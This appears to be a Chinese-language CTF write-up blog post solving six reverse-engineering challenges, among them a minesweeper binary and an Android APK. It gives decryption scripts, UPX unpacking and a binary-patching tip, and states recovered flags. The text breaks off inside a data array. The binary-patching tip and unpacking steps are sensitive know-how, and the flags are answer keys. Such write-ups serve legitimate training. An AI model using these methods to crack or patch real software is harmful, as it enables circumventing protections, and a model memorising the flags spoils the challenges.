        <content type="html"><![CDATA[<h1 id="mine">Mine</h1><p>DIE打开是x64的win程序,无壳,直接IDA.</p><p>进去一看,好家伙,c++的程序用gcc编译,那就分析吧.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013124905486.png" alt="image-20231013124905486" style="zoom:45%;" /><p>用控制台尝试运行一下,可以知道这是一个扫雷游戏,游戏题优先去找游戏终止判定,往往游戏胜利后会有一些关于flag的操作.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013125635703.png" alt="image-20231013125635703" style="zoom:33%;" /><p>中文乱码不影响,我们很容易能够找到游戏主循环体:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013125853759.png" alt="image-20231013125853759" style="zoom:33%;" /><p>1和2即为循环终止条件和当前成功找到的地雷数.</p><p>再往后看找到游戏胜利处理:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013130011930.png" alt="image-20231013130011930" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013130051478.png" alt="image-20231013130051478" style="zoom:33%;" /><p>这里C++的代码不予解释…别问,问就是去打基础…</p><p>我们发现<code>ans</code>数组在运行时初始化,我们通过交叉引用可以找到,直接写代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> enc[] = <span class="string">&quot;*ur)O&#125;t@r&#123;u!c&amp;|&#125;d\\9m&gt;M4NtsrjL&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(enc);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (len-i)^enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果:</p><p><code>7ii3VecVgof3r6ssiP2g7E3HqwqhM</code></p><p>或者可以去开挂然后动调,但是我懒得去搞了…比赛的时候试了一下,没有问题,我的做法是把</p><p><code>while ( 100 - mine_sum != res )</code>的<code>100</code>给patch成25(mine_sum初始值是25),这样游戏直接胜利(我不会玩扫雷).</p><p>一样可以输出结果.</p><p>最后就是最抽象的了,我们要进行base58解码,还得是那个特定的网站才行…我一度以为我做错了…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013132203167.png" alt="image-20231013132203167" style="zoom:33%;" /><p>结束…</p><h1 id="easyezbaby-app">easyEZbaby_app</h1><p>这题也很简单,会一点java就好.</p><p>我们看到apk先丢到模拟器跑一下看看(我没搞,直接看的代码Orz),然后喂给JADX反编译.</p><p>onClick()方法中可以看到只要求出这里的obj和obj2即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013145006310.png" alt="image-20231013145006310" style="zoom:340%;" />从checkUsername()方法中知道obj字符串就是<code>&quot;zhishixuebao&quot;</code>的<code>md5</code>摘要的各个奇数位的字符:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013145254632.png" alt="image-20231013145254632" style="zoom:40%;" />写脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;zhishixuebao&quot;</span></span><br><span class="line">md5_str = md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="comment"># 取出偶数下标的字符</span></span><br><span class="line"><span class="built_in">print</span>(md5_str[::<span class="number">2</span>])</span><br><span class="line"><span class="comment">#7afc4fcefc616ebd</span></span><br></pre></td></tr></table></figure><p>分析checkPass()方法,我们直接爆破即可(懒得反推了,实际上就换一下位置就行…):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt;= <span class="number">128</span>; ++c) &#123;</span><br><span class="line">            <span class="type">int</span> temp = ((((<span class="number">255</span> - i) + <span class="number">2</span>) - <span class="number">98</span>) - c);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(c); <span class="comment">// onmlkjihgfedcba</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接起来就是:</p><p><code>flag&#123;7afc4fcefc616ebdonmlkjihgfedcba&#125;</code></p><p>结束…</p><h1 id="ezorz">ezOrz</h1><p>这题我出的…不难吧…怎么这道题做出来的人最少…我反思Orz</p><p>程序有一个加壳,先使用UPX去壳.</p><p>使用IDA分析可得,题目中有一个密钥,要用其进行加密.</p><p>但是密钥经过了处理,将密钥的每个字节进行了<code>高4位和低4位的交换</code>.然后,将输入的flag<code>从前向后对相邻两个字节进行异或变换</code>.</p><p>最后使用处理过的密钥对同样处理过的flag进行<code>循环异或</code>,得到加密的数据.</p><p>将得到的数据和程序中的一个数组进行比较,可知这个数组就是密文.</p><p>需要注意的是,密文可能是在程序中赋值的,而且不是按字符串进行赋值,需要进行动态调试,然后提取出来.</p><p>按顺序反过来编写代码即可,代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">swap_bit4</span><span class="params">(<span class="type">char</span> *a, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="type">char</span> temp = a[i];</span><br><span class="line">        temp = (temp &lt;&lt; <span class="number">4</span>) + (temp &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        a[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_xor</span><span class="params">(<span class="type">char</span> *a, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = len - <span class="number">2</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        a[i] ^= a[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//buf需要动态调试从IDA导出</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>] = &#123;</span><br><span class="line">            <span class="number">174</span>,  <span class="number">27</span>, <span class="number">224</span>, <span class="number">233</span>, <span class="number">184</span>,  <span class="number">51</span>, <span class="number">180</span>, <span class="number">156</span>, <span class="number">177</span>, <span class="number">124</span>,</span><br><span class="line">            <span class="number">40</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">101</span>, <span class="number">186</span>, <span class="number">235</span>,  <span class="number">67</span>, <span class="number">239</span>, <span class="number">136</span>,  <span class="number">12</span>,</span><br><span class="line">            <span class="number">46</span>,  <span class="number">86</span>,   <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">19</span>;++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,buf[i]);</span><br><span class="line">    <span class="type">char</span> v[] = <span class="string">&quot;Jan_Ye_yyds_Orz&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">19</span>;</span><br><span class="line">    swap_bit4(v, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++) &#123;</span><br><span class="line">        buf[i] ^= v[i % <span class="built_in">strlen</span>(v)];</span><br><span class="line">    &#125;</span><br><span class="line">    my_xor(buf, <span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">19</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{V3ry_ez_1sn!t}</p><p>结束…</p><h1 id="ezpy">ezpy</h1><p>这题还是我出的…巨简单,RC4直接把密文当明文再跑一遍就行.</p><p>简单的将密文进行base64解码,然后进行RC4解密即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">keys = <span class="string">&#x27;Flag&#123;This_a_Flag&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;xxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_something</span>(<span class="params">enc=<span class="string">&#x27;&#x27;</span>, key=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    enc += <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> enc:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        k = s_box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        <span class="comment"># print(i, end=&quot;&quot;)</span></span><br><span class="line">        res_str += i</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;wq3CocO5wqXDtEotBDA6XsKrw7DDvsOxw54fOjrCpMO/b8OcwrfCgMOi&#x27;</span></span><br><span class="line">res = base64.b64decode(res.encode()).decode()</span><br><span class="line">res = do_something(res, keys)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># res = wq3CocO5wqXDtEotBDA6XsKrw7DDvsOxw54fOjrCpMO/b8OcwrfCgMOi</span></span><br></pre></td></tr></table></figure><p>flag{Ju2t_4n_3x4mple_RCa}</p><p>结束…</p><h1 id="eazyre">eazyre</h1><p>有UPX3.95加壳,直接用upx脱壳,再分析:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013151027895.png" alt="image-20231013151027895" style="zoom:33%;" /><p>找字符串,发现f_part2有flag的后半截:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013151132760.png" alt="image-20231013151132760" style="zoom:40%;" /><p>part1函数中有前半截,直接按r快捷键然后排列处理一下出flag(注意小端序转换):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013151300702.png" alt="image-20231013151300702" style="zoom:40%;" /><p>flag{UPX_4nd_0n3_4nd_tw0}</p><p>结束…</p><h1 id="eazyxor">eazyxor</h1><p>第一步对flag进行循环异或加密,密钥为<code>&quot;SCNU&quot;</code>.</p><p>然后将flag每一个字符转换为特定数量的’1’和一个’0’,其中’1’的数量为该字符的ASCII码.</p><p>提取出数据直接写解密程序即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span 